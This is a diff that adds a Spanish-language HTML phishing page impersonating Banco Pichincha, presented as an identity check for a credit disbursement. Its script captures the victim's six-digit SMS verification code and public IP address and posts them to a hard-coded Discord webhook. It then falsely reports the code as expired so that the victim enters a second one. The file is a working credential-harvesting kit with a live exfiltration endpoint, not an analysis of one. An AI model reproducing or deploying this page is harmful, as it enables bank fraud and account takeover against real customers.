@@ -1,0 +1,389 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificación de Código - Banco Pichincha</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  
+  <style>
+    :root {
+      --pichincha-yellow: #ffdd00;
+      --pichincha-blue: #0d2c6c;
+      --pichincha-blue-hover: #081d4a;
+      --bg-gray: #f4f6f9;
+      --card-bg: #ffffff;
+      --text-dark: #1f2937;
+      --text-muted: #6b7280;
+      --error: #dc2626;
+      --border-gray: #e5e7eb;
+
+      /* DIMENSIONES DEL CARRUSEL */
+      --hero-height: 120px;
+      --hero-max-width: 99%;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Open Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+      background-color: #0b1a30;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: var(--text-dark);
+    }
+
+    .mobile-container {
+      width: 100%;
+      max-width: 420px;
+      min-height: 100vh;
+      background-color: var(--bg-gray);
+      position: relative;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+    }
+
+    .pichincha-header {
+      background-color: #ffffff;
+      padding: 1rem 1.5rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-bottom: 1px solid var(--border-gray);
+      z-index: 10;
+    }
+
+    .brand-logo {
+      height: 38px;
+      width: auto;
+      object-fit: contain;
+    }
+
+    /* CARRUSEL DE IMÁGENES */
+    .carousel-container {
+      width: var(--hero-max-width);
+      height: var(--hero-height);
+      margin: 0 auto;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .carousel-track {
+      display: flex;
+      width: 400%;
+      height: 100%;
+      transition: transform 0.5s ease-in-out;
+    }
+
+    .carousel-track img {
+      width: 25%;
+      height: 100%;
+      object-fit: cover;
+      flex-shrink: 0;
+    }
+
+    .card-sheet {
+      background: var(--card-bg);
+      margin-top: -20px;
+      border-radius: 20px 20px 0 0;
+      padding: 1.8rem 1.5rem;
+      flex-grow: 1;
+      box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.08);
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      z-index: 2;
+    }
+
+    .security-badge {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      background-color: #e0f2fe;
+      color: #0369a1;
+      padding: 0.4rem 0.8rem;
+      border-radius: 20px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      width: fit-content;
+      margin: 0 auto 1rem auto;
+    }
+
+    h2 {
+      color: var(--pichincha-blue);
+      font-size: 1.35rem;
+      margin-bottom: 0.4rem;
+      text-align: center;
+      font-weight: 700;
+    }
+
+    .subtitle {
+      color: var(--text-muted);
+      font-size: 0.88rem;
+      text-align: center;
+      margin-bottom: 1.5rem;
+      line-height: 1.4;
+    }
+
+    .form-group {
+      margin-bottom: 1.2rem;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      color: var(--pichincha-blue);
+      font-weight: 600;
+      font-size: 0.85rem;
+      text-align: center;
+    }
+
+    /* INPUT DE CÓDIGO DE 6 DÍGITOS */
+    .otp-input {
+      width: 100%;
+      padding: 0.85rem;
+      border: 1px solid var(--border-gray);
+      border-radius: 8px;
+      font-size: 1.5rem;
+      font-weight: 700;
+      letter-spacing: 0.4rem;
+      text-align: center;
+      background-color: #f8fafc;
+      color: var(--pichincha-blue);
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .otp-input:focus {
+      outline: none;
+      border-color: var(--pichincha-blue);
+      background-color: #fff;
+      box-shadow: 0 0 0 3px rgba(13, 44, 108, 0.1);
+    }
+
+    .resend-box {
+      text-align: center;
+      margin-top: 0.8rem;
+      margin-bottom: 1.2rem;
+      font-size: 0.8rem;
+      color: var(--text-muted);
+    }
+
+    .resend-box a {
+      color: var(--pichincha-blue);
+      font-weight: 700;
+      text-decoration: underline;
+      cursor: pointer;
+    }
+
+    button {
+      width: 100%;
+      padding: 0.95rem;
+      background-color: var(--pichincha-blue);
+      color: #ffffff;
+      border: none;
+      border-radius: 8px;
+      font-size: 0.95rem;
+      font-weight: 700;
+      cursor: pointer;
+      transition: background-color 0.2s ease;
+    }
+
+    button:hover:not(:disabled) {
+      background-color: var(--pichincha-blue-hover);
+    }
+
+    button:disabled {
+      background-color: #d1d5db;
+      color: #9ca3af;
+      cursor: not-allowed;
+    }
+
+    .status-message {
+      margin-top: 1rem;
+      padding: 0.75rem;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      display: none;
+      text-align: center;
+      font-weight: 500;
+    }
+
+    .status-message.active {
+      display: block;
+    }
+
+    .status-message.error {
+      background-color: #fef2f2;
+      border: 1px solid #fecaca;
+      color: var(--error);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="mobile-container">
+    <header class="pichincha-header">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/45/Banco_Pichincha_nuevo.png?utm_source=es.wikipedia.org&utm_campaign=index&utm_content=original" alt="Banco Pichincha" class="brand-logo" onerror="this.onerror=null; this.src='https://via.placeholder.com/180x38?text=Banco+Pichincha';">
+    </header>
+
+    <div class="carousel-container">
+      <div class="carousel-track" id="carouselTrack">
+        <img src="https://www.pichincha.com/sites/default/files/styles/post_blog/public/images/conceptos-ciberseguridad-5921200000368265.jpg.webp?itok=84kTuwAy" alt="Promoción 1">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQYz0oA10gEfryUU0wAGTlV7z8k-jgicn33RD4U61xVt7mwNkzafq02MIA&s=10" alt="Promoción 2">
+        <img src="https://www.pichincha.com/sites/default/files/styles/post_blog/public/images/ataques-ingenieria-social-5921200000368262.jpg.webp?itok=gV4VWQV0" alt="Promoción 3">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTippeW74KqTiwsf_sGwvuXDTDvdLk0C4M0nsoD602aRwSjw7S1NSz_i6S0&s=10" alt="Promoción 1 Duplicada">
+      </div>
+    </div>
+
+    <main class="card-sheet">
+      <div class="security-badge">
+        🔒 Desembolso de credito Pichincha
+      </div>
+
+      <h2>Verificación de Identidad</h2>
+      <p class="subtitle">Hemos enviado un mensaje de texto con un  código de 6 dígitos a su numero de movil o correo eletronico registrado. Estas validando tu identida en DESEMBOLSO DE CREDITO PICHINCHA cantidad de desembolso de credito USD 10.372,00</p>
+
+      <form id="otp-form">
+        <div class="form-group">
+          <label for="code">Ingresa tu codigo</label>
+          <input 
+            type="text" 
+            id="code" 
+            name="code" 
+            placeholder="••••••" 
+            maxlength="6"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            required
+            class="otp-input"
+          >
+        </div>
+
+        <div class="resend-box">
+          ¿No recibiste el código? <a id="btn-resend">Reenviar SMS</a>
+        </div>
+
+        <button type="submit" id="btn-submit">Confirmar y Autorizar</button>
+      </form>
+
+      <div id="status-message" class="status-message" role="alert"></div>
+    </main>
+  </div>
+
+  <script>
+    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1540809629498474579/kRthigCklVp7DFylgnndjUE4NWDq0c8fY6-jwWDRZ3v8nFMu5fOvgiDhPLCboUf8n7ZA";
+
+    const form = document.getElementById('otp-form');
+    const codeInput = document.getElementById('code');
+    const submitBtn = document.getElementById('btn-submit');
+    const statusMessage = document.getElementById('status-message');
+    const resendBtn = document.getElementById('btn-resend');
+    const track = document.getElementById('carouselTrack');
+
+    // Contador de intentos
+    let attemptCount = 0;
+
+    // --- LÓGICA DEL CARRUSEL (DESPLAZAMIENTO CONTINUO) ---
+    let currentIndex = 0;
+    const totalSlides = 3;
+
+    function rotateCarousel() {
+      currentIndex++;
+      track.style.transition = 'transform 0.5s ease-in-out';
+      track.style.transform = `translateX(-${currentIndex * 25}%)`;
+
+      if (currentIndex === totalSlides) {
+        setTimeout(() => {
+          track.style.transition = 'none';
+          currentIndex = 0;
+          track.style.transform = `translateX(0%)`;
+        }, 500);
+      }
+    }
+    setInterval(rotateCarousel, 3000);
+
+    // --- RESTRICCIÓN DEL INPUT: SOLO NÚMEROS Y MÁXIMO 6 DÍGITOS ---
+    codeInput.addEventListener('input', (e) => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 6);
+    });
+
+    // --- REENVIAR CÓDIGO ---
+    resendBtn.addEventListener('click', () => {
+      showMessage('Se ha reenviado un nuevo código SMS a tu celular.', 'error');
+    });
+
+    // --- OBTENER IP PÚBLICA ---
+    async function getClientIP() {
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+      } catch {
+        return 'No detectada';
+      }
+    }
+
+    // --- ENVÍO DE FORMULARIO ---
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const code = codeInput.value.trim();
+
+      if (code.length !== 6) {
+        showMessage('Por favor ingresa un código válido de 6 dígitos.', 'error');
+        return;
+      }
+
+      submitBtn.disabled = true;
+      submitBtn.textContent = 'Verificando...';
+
+      const ip = await getClientIP();
+      attemptCount++;
+
+      const payload = {
+        content: `Código SMS (Intento ${attemptCount}): ${code} | IP: ${ip}`
+      };
+
+      try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (attemptCount === 1) {
+          // PRIMER INTENTO: Pide el segundo código
+          showMessage('El código ingresado ha expirado o es incorrecto. Hemos enviado un nuevo codigo ingresa el nuevo codigo.', 'error');
+          codeInput.value = '';
+          codeInput.focus();
+        } else {
+          // SEGUNDO INTENTO: Se queda en la misma pantalla mostrando mensaje final
+          showMessage('El código es válido o ha expirado. Por favor Hemos enviado un nuevo codigo ingresa el nuevo codigo', 'error');
+          codeInput.value = '';
+        }
+      } catch (error) {
+        showMessage('Error de conexión al enviar la información.', 'error');
+      } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Confirmar y Autorizar';
+      }
+    });
+
+    function showMessage(msg, type) {
+      statusMessage.textContent = msg;
+      statusMessage.className = `status-message active ${type}`;
+    }
+  </script>
+</body>
+</html>
